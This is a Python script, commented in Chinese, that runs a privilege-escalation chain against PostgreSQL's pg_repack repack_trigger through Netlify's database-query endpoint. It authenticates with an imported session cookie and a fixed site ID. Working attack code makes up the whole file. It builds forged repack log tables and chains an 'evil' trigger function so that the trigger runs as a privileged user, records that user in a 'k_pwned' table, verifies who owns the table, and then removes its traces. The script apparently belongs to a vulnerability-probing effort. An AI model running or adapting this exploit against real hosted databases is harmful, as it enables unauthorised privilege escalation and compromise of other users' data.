# -*- coding: utf-8 -*-
"""波22:repack_trigger 提权链 v2 —— 按 repack.c 源码精确构造 log 表
log 表结构:CREATE TABLE repack.log_<oid> (pk repack.pk_<oid>, row public.<src>)
pk 类型:   CREATE TYPE repack.pk_<oid> AS (<主键列定义>)
触发器参数 = 主键列名(源码 quote_identifier(tgargs[i]) -> $1.<col>)
B1 源表 + oid
B2 预建 pk 类型 + log 表
B3 evil 函数 + log 表 AFTER 触发器 + 源表 repack_trigger('id') + INSERT
B4 验证 k_pwned owner
B5 清理
"""
import http.client, ssl, gzip, brotli, json, sys, time, re
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_NET

SITE_ID = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
ctx = ssl.create_default_context()
P = '/.netlify/functions/database-query'


def tx(qs, timeout=60):
    t0 = time.time()
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_NET,
         'Content-Type': 'application/json'}
    body = {'siteId': SITE_ID, 'action': 'transaction', 'queries': [{'sql': x} for x in qs]}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw[:8000].decode('utf-8', 'ignore'), round(time.time() - t0, 1)


# B1: 源表 + oid
s, b, dt = tx(["drop table if exists k_src",
               "create table k_src(id int, v text)",
               "select 'OID='||oid||' NAME='||relname from pg_class where relname='k_src'"])
print('B1_src_oid       [%d] %.1fs' % (s, dt))
print('   ' + b[:1500])
m = re.search(r'OID=(\d+)', b)
oid = m.group(1) if m else None
print('   -> src oid =', oid)
if not oid:
    sys.exit('B1 未解析 oid')
print()

# B2: pk 复合类型 + log 表(按 repack.c 结构)
s, b, dt = tx(["create type repack.pk_%s as (id int)" % oid,
               "create table repack.log_%s (pk repack.pk_%s, row public.k_src)" % (oid, oid)])
print('B2_mktype_log    [%d] %.1fs' % (s, dt))
print('   ' + b[:1000])
print()

# B3: 触发链
evil = ("create or replace function public.k_evil() returns trigger language plpgsql as $q$ "
        "begin "
        "  execute 'drop table if exists public.k_pwned'; "
        "  execute 'create table public.k_pwned as select current_user::text as u, session_user::text as su'; "
        "  return new; "
        "end $q$")
s, b, dt = tx(["drop trigger if exists k_log_trg on repack.log_%s" % oid,
               "drop trigger if exists k_src_trg on k_src",
               evil,
               "create trigger k_log_trg after insert on repack.log_%s for each row execute function public.k_evil()" % oid,
               "create trigger k_src_trg after insert on k_src for each row execute function repack.repack_trigger('id')",
               "insert into k_src values (1, 'hello')"])
print('B3_trigger_chain [%d] %.1fs' % (s, dt))
print('   ' + b[:3000])
print()

# B4: 验证 k_pwned 的 owner
s, b, dt = tx(["select tableowner from pg_tables where tablename='k_pwned'",
               "select * from k_pwned"])
print('B4_verify        [%d] %.1fs' % (s, dt))
print('   ' + b[:2000])
print()

# B5: 清理
s, b, dt = tx(["drop trigger if exists k_src_trg on k_src",
               "drop trigger if exists k_log_trg on repack.log_%s" % oid,
               "drop function if exists public.k_evil()",
               "drop table if exists public.k_pwned",
               "drop table if exists k_src",
               "drop table if exists repack.log_%s" % oid,
               "drop type if exists repack.pk_%s" % oid])
print('B5_cleanup       [%d] %.1fs' % (s, dt))
print('   ' + b[:500])
